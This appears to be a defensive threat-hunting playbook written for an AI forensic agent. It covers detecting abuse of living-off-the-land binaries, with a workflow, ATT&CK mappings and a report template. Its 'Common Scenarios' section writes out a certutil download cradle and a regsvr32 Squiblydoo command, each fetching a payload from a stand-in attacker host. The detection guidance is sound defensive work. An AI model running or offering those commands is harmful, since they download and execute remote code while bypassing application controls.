---
name: cb-hunting-for-living-off-the-land-binaries
skill_id: cb-hunting-for-living-off-the-land-binaries
journal_id: CB-SKL-236
description: Cold-box analyst playbook — Hunting For Living Off The Land Binaries.
  Proactively hunt for adversary abuse of legitimate system binaries (LOLBins) to
  execute malicious payloads while evading detection.
domain: cold-box
subdomain: threat-hunting
tier: adjacent
case_profiles:
- soc_siem
execution_mode: sift_runnable
artifact_platforms:
- any
host_platforms:
- linux
tags:
- threat-hunting
- mitre-attack
- lolbins
- edr
- siem
- proactive-detection
- defense-evasion
cold_box_version: 2
inspired_by: hunting-for-living-off-the-land-binaries
---

# Hunting For Living Off The Land Binaries (cold-box)

> **Journal ID:** `CB-SKL-236` — cite this in every journal entry while following this playbook.

## Cold-box constraints (always)

- Evidence lives on the **sealed operation table** — read only through the viewport (`input_relpath`).
- **Never write** on `operation-table/`; tool output goes to `records/{case_id}/scratch/`.
- **Log this playbook** in the case journal with **`CB-SKL-236`** (`log_skill`) when you adopt it and at each major step.
- Every SIFT execution: `run_sift_tool` with **`purpose`**, **`why`**, and cite returned **`tool_id`** + **`audit_id`** in the journal.
- Prefer `list_sift_tools(verified_only=true)` — skip `[BAD — DO NOT USE]` tools.
- Load this playbook with `get_skill("cb-hunting-for-living-off-the-land-binaries")`; do not treat markdown code blocks as direct shell commands.

## Agent loop

1. `suggest_skills(case_profile=...)` or `get_skill("cb-hunting-for-living-off-the-land-binaries")` → note **`CB-SKL-236`**
2. `log_skill(case_id, journal_id="CB-SKL-236", action="adopted", note="...")`
3. `list_sift_tools(verified_only=true)` → pick tools from the map below
4. `describe_sift_tool(tool_id)` → `run_sift_tool(...)` → journal stdout with `CB-SKL-236` + `audit_id`
5. `log_skill(..., action="finding", note="...")` when recording conclusions; self-correct if outputs conflict


## When to use

- When investigating fileless malware campaigns that bypass traditional AV
- During proactive threat hunts targeting defense evasion techniques
- When EDR alerts fire on legitimate binaries executing unusual child processes
- After threat intelligence reports indicate LOLBin abuse in active campaigns
- During red team/purple team exercises validating detection coverage for T1218

## Tool map (SIFT via MCP)

**Execution mode:** `sift_runnable` — SIFT tools below are available on this host.

| binary | tool_id | verified | available |
|--------|---------|----------|-----------|
| `powershell` | `SIFT-179` | no | no |
| `regsvr32` | `SIFT-100` | no | yes |
| `wmic` | `SIFT-186` | no | no |
| `file` | `SIFT-008` | yes | yes |

## Cold-box MCP examples

Use these instead of running shell blocks directly. Always log `{journal_id}` in purpose/why or via `log_skill`.

### `powershell` → `SIFT-179`

```json
{
  "tool_id": "SIFT-179",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-236] powershell per playbook step",
  "why": "Executing cb-hunting-for-living-off-the-land-binaries \u2014 see Procedure section",
  "extra_args": []
}
```

### `regsvr32` → `SIFT-100`

```json
{
  "tool_id": "SIFT-100",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-236] regsvr32 per playbook step",
  "why": "Executing cb-hunting-for-living-off-the-land-binaries \u2014 see Procedure section",
  "extra_args": []
}
```

### `wmic` → `SIFT-186`

```json
{
  "tool_id": "SIFT-186",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-236] wmic per playbook step",
  "why": "Executing cb-hunting-for-living-off-the-land-binaries \u2014 see Procedure section",
  "extra_args": []
}
```

### `file` → `SIFT-008`

```json
{
  "tool_id": "SIFT-008",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-236] file per playbook step",
  "why": "Executing cb-hunting-for-living-off-the-land-binaries \u2014 see Procedure section",
  "extra_args": []
}
```

## Journal logging

When you adopt this playbook, append to `records/{case_id}/{case_id}.md`:

```markdown
## {timestamp} — skill `CB-SKL-236` (`cb-hunting-for-living-off-the-land-binaries`)

- **action:** adopted | step | finding | deferred | completed
- **note:** What you did or concluded under this playbook
- **related_audit_ids:** (optional) CB-… from run_sift_tool
```

Or call MCP: `log_skill(case_id, journal_id="{journal_id}", action="adopted", note="...")`

## Cold-box path translation

When the procedure below uses host paths, translate as follows:

| Procedure path | Cold-box equivalent |
|----------------|---------------------|
| `C:\Evidence\...` / `/cases/...` | `{input_relpath}` on the sealed table (via viewport) |
| `C:\Output\...` / `/analysis/...` | `records/{case_id}/scratch/` (tool stdout/files) |
| Live SIEM / cloud console steps | **Reference only** on cold-box — note capability gap in journal |

Do not copy evidence off the table except into `records/{case_id}/scratch/` via `run_sift_tool`.


## Procedure

## When to Use

- When investigating fileless malware campaigns that bypass traditional AV
- During proactive threat hunts targeting defense evasion techniques
- When EDR alerts fire on legitimate binaries executing unusual child processes
- After threat intelligence reports indicate LOLBin abuse in active campaigns
- During red team/purple team exercises validating detection coverage for T1218

## Prerequisites

- Access to EDR telemetry (CrowdStrike, Microsoft Defender for Endpoint, SentinelOne)
- SIEM with process creation logs (Sysmon Event ID 1, Windows Security 4688)
- Familiarity with LOLBAS Project (lolbas-project.github.io) reference list
- PowerShell command-line logging enabled (Module Logging, Script Block Logging)
- Network proxy or firewall logs for correlating outbound connections

## Workflow

1. **Define Hunt Hypothesis**: Formulate a hypothesis based on threat intel (e.g., "Adversaries are using certutil.exe to download second-stage payloads from external domains").
2. **Identify Target LOLBins**: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).
3. **Collect Process Telemetry**: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.
4. **Baseline Normal Behavior**: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.
5. **Identify Anomalies**: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.
6. **Correlate and Enrich**: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.
7. **Document and Report**: Record findings, update detection rules, and create IOC lists for identified malicious LOLBin usage.

## Key Concepts

| Concept | Description |
|---------|-------------|
| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.002 | Control Panel (control.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 |
| T1218.011 | Rundll32 |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| Proxy Execution | Using trusted binaries to execute untrusted code |
| Fileless Attack | Attack that operates primarily in memory without dropping files |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CrowdStrike Falcon | EDR telemetry and process tree analysis |
| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
| Splunk | SIEM log aggregation and SPL queries |
| Elastic Security | Detection rules and timeline investigation |
| Sysmon | Detailed process creation and network logging |
| LOLBAS Project | Reference database of LOLBin capabilities |
| Sigma Rules | Generic detection rule format for LOLBins |
| Velociraptor | Endpoint forensic collection and hunting |

## Common Scenarios

1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Hypothesis: [Stated hypothesis]
LOLBins Investigated: [List of binaries]
Time Range: [Start] - [End]
Data Sources: [EDR, Sysmon, SIEM]
Findings:
  - [Finding 1 with evidence]
  - [Finding 2 with evidence]
Anomalies Detected: [Count]
True Positives: [Count]
False Positives: [Count]
IOCs Identified: [List]
Detection Rules Created/Updated: [List]
Recommendations: [Next steps]
```

## Self-correction

- If a SIFT tool errors, read `describe_sift_tool` and pick an alternate from the tool map.
- If procedure steps require SIEM/cloud/live APIs, log `{journal_id}` + `action=deferred` with the gap.
- Do not override `[BAD — DO NOT USE]` tools.
- Mark inference vs confirmed in journal; tie confirmed findings to `audit_id`.

## Limits

- Playbooks guide reasoning; **confirmed findings require tool output** in scratch with matching `audit_id`.
- Reference-mode steps are not executable on cold-box until equivalent SIFT tooling exists.
